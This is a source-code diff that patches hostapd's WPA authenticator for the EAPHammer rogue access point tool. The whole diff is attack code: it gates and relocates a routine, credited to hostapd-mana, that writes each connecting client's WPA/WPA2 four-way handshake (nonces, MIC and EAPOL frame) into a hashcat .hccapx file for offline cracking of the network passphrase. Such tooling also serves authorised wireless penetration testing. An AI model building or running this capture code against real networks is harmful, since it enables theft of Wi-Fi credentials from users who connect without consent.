@@ -31,6 +31,10 @@
 #include "wpa_auth_i.h"
 #include "wpa_auth_ie.h"
 
+#ifdef EAPHAMMER
+#include "eaphammer_wpe/eaphammer_wpe.h"
+#endif
+
 #define STATE_MACHINE_DATA struct wpa_state_machine
 #define STATE_MACHINE_DEBUG_PREFIX "WPA"
 #define STATE_MACHINE_ADDR sm->addr
@@ -1023,47 +1027,50 @@ void wpa_receive(struct wpa_authenticator *wpa_auth,
 	FILE *psk_cap_file = NULL;
 	int i = 0;
 
-	// This is pretty much straight hostapd-mana except for some tweaks to work
-	// with the latest version of hostapd. Sensepost gets
-	// credit for original implementation.
-	psk_cap_file = fopen("swag.hcapx", "ab");
-	if (psk_cap_file != NULL) {
+	if (eaphammer_global_conf.capture_wpa_handshakes) {
 
-		fwrite("\x48\x43\x50\x58",4,1,psk_cap_file); //Signature
-		fwrite("\x04\x00\x00\x00",4,1,psk_cap_file); //Version
-		fwrite("\x00",1,1,psk_cap_file); //Message Pair (M1+M2)
-		fwrite(&wpa_auth->conf.ssid_len,1,1,psk_cap_file);
-		fwrite(wpa_auth->conf.ssid,32,1,psk_cap_file);
-		fwrite(&key->type,1,1,psk_cap_file);
-		
-		fwrite(mic,16,1,psk_cap_file); //hashcat truncates to 16
-		
-		fwrite(sm->wpa_auth->addr,ETH_ALEN,1,psk_cap_file);
-		fwrite(sm->ANonce,WPA_NONCE_LEN,1,psk_cap_file);
-		fwrite(sm->addr,ETH_ALEN,1,psk_cap_file);
-		fwrite(key->key_nonce,WPA_NONCE_LEN,1,psk_cap_file);
-		fwrite(&data_len,2,1,psk_cap_file);
-		fwrite(hdr,sizeof(*hdr),1,psk_cap_file);
+		// This is pretty much straight hostapd-mana except for some 
+		//tweaks to work with the latest version of hostapd.
+		// Sensepost gets credit for original implementation.
+		psk_cap_file = fopen(eaphammer_global_conf.psk_capture_file, "ab");
+		if (psk_cap_file != NULL) {
 
-		fwrite(&key->type,1,1,psk_cap_file);
-		fwrite(key->key_info,2,1,psk_cap_file);
-		fwrite(key->key_length,2,1,psk_cap_file);
-		fwrite(key->replay_counter,WPA_REPLAY_COUNTER_LEN,1,psk_cap_file);
-		fwrite(key->key_nonce,WPA_NONCE_LEN,1,psk_cap_file);
-		fwrite(key->key_iv,16,1,psk_cap_file);
-		fwrite(key->key_rsc,WPA_KEY_RSC_LEN,1,psk_cap_file);
-		fwrite(key->key_id,8,1,psk_cap_file);
-		for (i=0;i<16;i++) {
-			fwrite("\x00",1,1,psk_cap_file);
+			fwrite("\x48\x43\x50\x58",4,1,psk_cap_file); //Signature
+			fwrite("\x04\x00\x00\x00",4,1,psk_cap_file); //Version
+			fwrite("\x00",1,1,psk_cap_file); //Message Pair (M1+M2)
+			fwrite(&wpa_auth->conf.ssid_len,1,1,psk_cap_file);
+			fwrite(wpa_auth->conf.ssid,32,1,psk_cap_file);
+			fwrite(&key->type,1,1,psk_cap_file);
+			
+			fwrite(mic,16,1,psk_cap_file); //hashcat truncates to 16
+			
+			fwrite(sm->wpa_auth->addr,ETH_ALEN,1,psk_cap_file);
+			fwrite(sm->ANonce,WPA_NONCE_LEN,1,psk_cap_file);
+			fwrite(sm->addr,ETH_ALEN,1,psk_cap_file);
+			fwrite(key->key_nonce,WPA_NONCE_LEN,1,psk_cap_file);
+			fwrite(&data_len,2,1,psk_cap_file);
+			fwrite(hdr,sizeof(*hdr),1,psk_cap_file);
+
+			fwrite(&key->type,1,1,psk_cap_file);
+			fwrite(key->key_info,2,1,psk_cap_file);
+			fwrite(key->key_length,2,1,psk_cap_file);
+			fwrite(key->replay_counter,WPA_REPLAY_COUNTER_LEN,1,psk_cap_file);
+			fwrite(key->key_nonce,WPA_NONCE_LEN,1,psk_cap_file);
+			fwrite(key->key_iv,16,1,psk_cap_file);
+			fwrite(key->key_rsc,WPA_KEY_RSC_LEN,1,psk_cap_file);
+			fwrite(key->key_id,8,1,psk_cap_file);
+			for (i=0;i<16;i++) {
+				fwrite("\x00",1,1,psk_cap_file);
+			}
+			fwrite(&key_data_length,2,1,psk_cap_file);
+			fwrite(key+1,WPA_GET_BE16(&key_data_length),1,psk_cap_file);
+			for (i=0;i<(256 - sizeof(*hdr) - ntohs(hdr->length) - (0));i++) {
+				fwrite("\x00",1,1,psk_cap_file);
+			}
+			fclose(psk_cap_file);
+			wpa_printf(MSG_INFO, "[EAPHAMMER] Captured a WPA/2 handshake from: " MACSTR, MAC2STR(sm->addr));
 		}
-		fwrite(&key_data_length,2,1,psk_cap_file);
-		fwrite(key+1,WPA_GET_BE16(&key_data_length),1,psk_cap_file);
-		for (i=0;i<(256 - sizeof(*hdr) - ntohs(hdr->length) - (0));i++) {
-			fwrite("\x00",1,1,psk_cap_file);
-		}
-		fclose(psk_cap_file);
-		wpa_printf(MSG_INFO, "[EAPHAMMER] Captured a WPA/2 handshake from: " MACSTR, MAC2STR(sm->addr));
-		}
+	}
 
 #endif
 
